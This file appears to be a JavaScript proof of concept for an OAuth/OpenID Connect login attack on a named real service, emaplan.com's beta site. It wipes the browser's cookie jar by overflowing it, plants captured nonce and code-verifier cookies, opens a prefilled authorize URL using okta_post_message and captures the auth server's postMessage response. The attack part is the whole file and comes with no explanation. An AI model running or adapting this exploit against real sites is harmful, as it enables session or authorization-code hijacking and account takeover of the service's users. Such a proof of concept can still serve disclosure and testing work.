// PUT HERE YOUR VARS

var loginurl="https://auth.externalbeta2.emaplan.com/oauth2/default/v1/authorize?client_id=0oaedsgzjxZlGjbOX4h7&redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema%2Fauthorization-code%2Fcallback&response_type=code&scope=openid%20profile&code_challenge=srzXVLkKa1T1jwIDPrTxEreaDEtg-hLim3Q8UfLEtJQ&code_challenge_method=S256&state=OpenIdConnect.AuthenticationProperties%3DDwH43Sa7qQ0CgOjThRjcafef4gmPPGKzG98-MVaaKraOGQ9pR_4rmeiJ9l-LACupuk0tqU_iHdJ-HWk7H2uzxQHuoxa1Sx7X6fBLSpiy8JkfuvJjxiA513QU-f1ZhWQHGC1w3k-YvWJkwWSaynv8UCchieNJf5KF_l2DAdV7GmbsoX1oiuwLY1XC3oid-ojDP7jmwbT2vo9Eq3tApUlXdOnRDJGbi6s_SsIxcnNKVOngYUBQDCIWClzD4NnoRbY3JatIxtM2Cd9OwBh8H6b9umxS0uGAVzBT7vopCCy8Tn3eNKSb48dyVElVTw-LvBnyMJffphGSQ4xOvkD8yNBbXlkABnYcbXYKFK6JOZm3fUw1mBn5r1MptCqFYN2RNMGNqQDSXjBp8Lbcq_VJcQk5Y_7is1FIsFFGdx9kaHDpFClmBf5uWIsyDXL-qXdRh7UaZ3HpMjSyTJc_9WkyxMeyM6_bnuncatJHY4mhhwqys_7EZfuMku7g2CsLy78kFp1RLAMK6KHRyVDGBBPX8MsS-PQYnBg3eBaULK8VVGqJkk7tfD4oF8B_nW9Gb5kuO7cAprK7P5R83yqpJKI-U8Ms-qBRSsP-66ba1ECwADggc6-8HANYOhuKFuLnV3o58Q7ENvWHp1jwzz45zyBeFoGiVIcc8qpVHgCRAjk_eZGAOzOn5DrOX62vhsWHDT-ctPuAfAPJiNbw-iQXyLbcOSkmj8T6f4v_5XHNUrM4CWTe2DmwovHLSucHrwB1GQ3W0xzxKrc9qBPbW7NMYyY4nUQRxZsHLEJXIgxG0-ttwhL6bCL6zEI1p0yS2O1E32FLLQz-6UFTa-jNXpw5CLb9lhXN5pzizJIHSJZQ7E2lbep3-wjmiEjlxzELIXrYa0oEmGPHgNfA_mVLsbK3bPkR8KWnf5nWkepWpTs9PmNw6tCp0-Fg8RGjOASn0bPVUvq313yL4r2h_OU9NWC6WStjYjD0ooucNJsmDwzAMFXGc-EIByGay1W6-OfZDNtbikFrxmOEQjfSJIs2mA4_OyetAMuabUq0Gp32Hq6YH4jeTd7LXvf4KdqjJyyevi2C-ENUROB7PH9uNXBJ1Q6n0Qjcuvv1p7PSTzyK60K92mNWH8EHWPI8Vcs5gN1BdmjjcUmxRgjvXdY8dsZVPkCQaFb7M3-WBhrueyGna8hwt-ewpep8zCaFeT1MmrqO2csUiNOKIf6CQw6bhCyZ9Bddb-ZQQbHDrm7DQNREmZUtUYrUBgvIBrJdeg2zYbnxAkV3g7YfGOhukIL7NKel-NMxBdncH59mbkSnvuuwkxAaaKXtg-KFhB1h0XrMdXdmUamkD2kzOdE4umaAGq1SH5ZZ0xYfRqwNygh05fNiU2u49CHKNUe7aEw5mxWicIqsOiFsnm8hsqYTrfh0CcVAfWdCduIjzCpt4OY4hHFx5HF0lXp7VARSGjJm9-3ukTQchoIjgbFZbvkB8B8WcVaJTDOsuZJJ3CiZpKe0ysab0heK2EEAAYJt6fsuNgwbYbaRoZvY8nC_X9jmwHXHmqKzmeN4VwfedYdBXPIUhTUhUD76c9BB1lm93nYJfrVL1iq3-1XSx1v758I8lhtVtwDuECvnQITKKxVHFCsVelxGtxTt2kn60tfU09v14oA021gFRDrPb81dBEycdweg6I4GkUXrAtsXA_mwhSB2tx58g8vhPr9Mw6D0ST_VinFgqmEyfiC1RhBoi5-WqYcKSMe27jmOXhsFHHKBkfJpRnR8rX9opTq50IgOUe25pxZfPU8DMphQcffH_W8W803kOi0V4WFk4uWN5IZi7mJzoK2kZdMiXlkO0JlAaY6KGSW7obgi4hPImW6kT7aOwaFHRc6npnDN6fUxGzQKljG3ZmV11rkrttkQ4bOOLqJCQUElUejfI6uYMZtVk4jYAjunH3lmswn_QNSQh7VLX6TA17infFRanjJXzHiAGyHqrlocnP97wV7eIny7AO0u9GBbRfxDoxcX4FVLFyq3ZfbVCa3rj99FPP3_MGhUBwly6gQSb8T4jjjWq56A-yT9esdM3gRHnmic3dQmIxQapw&response_mode=okta_post_message&nonce=638766373832257192.NTAyOGEyODItZWI3MS00NzdkLWJlNzUtNmQ5NWYxYTU2YTFk&login_hint=H1Client00422&partner=ema&office=ema&logo=partner%2Fdefault%2FFiles%2FImages%2FHeader%2FTopLeftLogo.gif%3Fv%3D1039623088&enable_spi_sso=False&post_logout_redirect_uri=https%3A%2F%2Fexternalbeta2.emaplan.com%2Fema&x-client-SKU=ID_NET472&x-client-ver=8.3.0.0";
var openidnonce="OpenIdConnect.nonce.ztvcqtzZDDhtvH1+ehJUNTd37ed+QFBUepxfHIgG8H8==MnlSTUZfNGk2SzBoUHEwOGVVb3I4UVI0NDJETTNtZmtvLW9LTDRJTmp1azNOTzctajVZSklFUnZyUEdNZXUwY0J4d3dVUUxYeVpaRk5JMUhmdWhuLW1HVVgyTkgyLXFwVldfX19aenBraU9vS2tvdzlyZmlBQ0pOVG9vRTFXWGZjODY2aFJVNkNDcXlBTXZCaXFvMnJoODZSMXNoSlZzelFpNm9jaGZtbHYzd1ZBejNnT2pUZzdPcUtLMEhTOG5WN0cyWjFGTDA2S0lBZXgyVmM1b3B2djVNdVRYcmZrcjdXQ2ZjaU8tYS01bw==";
var openIdcv="OpenIdConnect.cv.swTHPxJDeekO436q1UuqSUTJAWy%2fKlBij5rBDN4AQJw%3d=SndEbFpJOElnU0ZCTHpyeU9NWGJyN0pxTzhEVG9PMWpjUktfamdvOTRBQTNuNWhDUWJoNm4yeEZra3IxMk9mbzI3RDRCWVZPVDd1TXFLQ3RHS01HcWdjaVRvWWJJNFdOZ3ZFTDlJRUJFUWl0TUtzY1Z0UTR5YVpiSG1xOHRQZk1Lb09HWndxMkxTVVUzSG5LdmNQTDVB";

function deleteAllCookies() {
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}; Secure`;
    }

    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
}

function executePoC(){
    var x = window.open(loginurl);
    window.addEventListener('message',(e)=>{
        if (e.origin === "https://auth.externalbeta2.emaplan.com"){
            alert(JSON.stringify(e.data));
        }        
    });
}

function setCookies(){
    document.cookie=`${openidnonce}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`
    document.cookie=`${openIdcv}; expires=Mon, 24-Mar-2025 19:57:15 GMT; path=/;`;
}

deleteAllCookies();
setCookies();
executePoC();
